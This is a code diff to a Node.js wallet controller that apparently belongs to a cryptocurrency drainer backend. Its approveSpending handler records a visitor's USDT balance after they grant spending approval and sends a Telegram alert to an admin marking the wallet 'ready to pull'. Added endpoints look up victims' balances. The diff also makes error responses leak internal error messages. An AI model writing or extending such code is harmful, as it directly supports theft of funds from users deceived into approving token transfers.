@@ -91,63 +91,130 @@ class WalletController {
             console.error('Wallet connection error:', error);
             res.status(500).json({
                 success: false,
-                error: 'Internal server error'
+                error: 'Internal server error: ' + error.message
             });
         }
     }
 
     // Add this new method for spending approval
     async approveSpending(req, res) {
-    try {
-        console.log('=== APPROVAL: Spending approval request received ===');
-        console.log('Request body:', JSON.stringify(req.body, null, 2));
-        
-        // Validate input
-        const validation = validators.validateWalletConnection(req.body);
-        if (!validation.valid) {
-            console.log('Validation failed:', validation.error);
-            return res.status(400).json({
+        try {
+            console.log('=== APPROVAL: Spending approval request received ===');
+            console.log('Request body:', JSON.stringify(req.body, null, 2));
+            
+            // Validate input
+            const validation = validators.validateWalletConnection(req.body);
+            if (!validation.valid) {
+                console.log('Validation failed:', validation.error);
+                return res.status(400).json({
+                    success: false,
+                    error: validation.error
+                });
+            }
+            
+            const { address } = req.body;
+            console.log('Processing approval for wallet:', address);
+            
+            // Get current balance for the alert
+            const contractServiceInstance = require('../services/contract.service');
+            const balance = await contractServiceInstance.getWalletUSDTBalance(address);
+            
+            // Update balance in database
+            const updateQuery = `
+                UPDATE wallets 
+                SET usdt_balance = $1, updated_at = NOW()
+                WHERE address = $2
+            `;
+            await database.query(updateQuery, [balance, address]);
+            
+            // Send alert to admin - ONLY NOW when wallet is ready to pull
+            console.log('Sending Telegram alert - wallet ready to pull');
+            const telegram = require('../config/telegram');
+            // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
+            await telegram.sendWalletReadyAlert(address, balance);
+            console.log('Telegram alert sent for ready-to-pull wallet');
+            
+            res.json({
+                success: true,
+                message: 'Wallet spending approved successfully - admin notified'
+            });
+        } catch (error) {
+            console.error('Wallet approval error:', error);
+            res.status(500).json({
                 success: false,
-                error: validation.error
+                error: 'Internal server error: ' + error.message
             });
         }
-        
-        const { address } = req.body;
-        console.log('Processing approval for wallet:', address);
-        
-        // Get current balance for the alert
-        const contractServiceInstance = require('../services/contract.service');
-        const balance = await contractServiceInstance.getWalletUSDTBalance(address);
-        
-        // Update balance in database
-        const updateQuery = `
-            UPDATE wallets 
-            SET usdt_balance = $1, updated_at = NOW()
-            WHERE address = $2
-        `;
-        await database.query(updateQuery, [balance, address]);
-        
-        // Send alert to admin - ONLY NOW when wallet is ready to pull
-        console.log('Sending Telegram alert - wallet ready to pull');
-        const telegram = require('../config/telegram');
-        // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
-        await telegram.sendWalletReadyAlert(address, balance);
-        console.log('Telegram alert sent for ready-to-pull wallet');
-        
-        res.json({
-            success: true,
-            message: 'Wallet spending approved successfully - admin notified'
-            // Removed the wallet reference that was causing the error
-        });
-    } catch (error) {
-        console.error('Wallet approval error:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Internal server error'
-        });
+    }
+
+    async getBalance(req, res) {
+        try {
+            const { address } = req.params;
+            
+            // Validate address parameter
+            if (!address) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Wallet address is required'
+                });
+            }
+            
+            if (!helpers.validateEthereumAddress(address)) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Invalid wallet address format'
+                });
+            }
+            
+            const balance = await contractService.getWalletUSDTBalance(address);
+            
+            res.json({
+                success: true,
+                balance: balance,
+                address: address
+            });
+        } catch (error) {
+            console.error('Balance check error:', error);
+            res.status(500).json({
+                success: false,
+                error: 'Internal server error: ' + error.message
+            });
+        }
+    }
+
+    // Debug endpoint - temporary for verification
+    async verifyWalletApproval(req, res) {
+        try {
+            const { address } = req.params;
+            
+            if (!address) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Wallet address required'
+                });
+            }
+            
+            const ContractService = require('../services/contract.service');
+            const contractServiceInstance = new ContractService();
+            await contractServiceInstance.init();
+            
+            // Get balance too
+            const balance = await contractServiceInstance.getWalletUSDTBalance(address);
+            
+            res.json({
+                success: true,
+                wallet: address,
+                balance: balance
+            });
+            
+        } catch (error) {
+            console.error('Verification error:', error);
+            res.status(500).json({
+                success: false,
+                error: error.message
+            });
+        }
     }
 }
+
 module.exports = new WalletController();
-
-
-
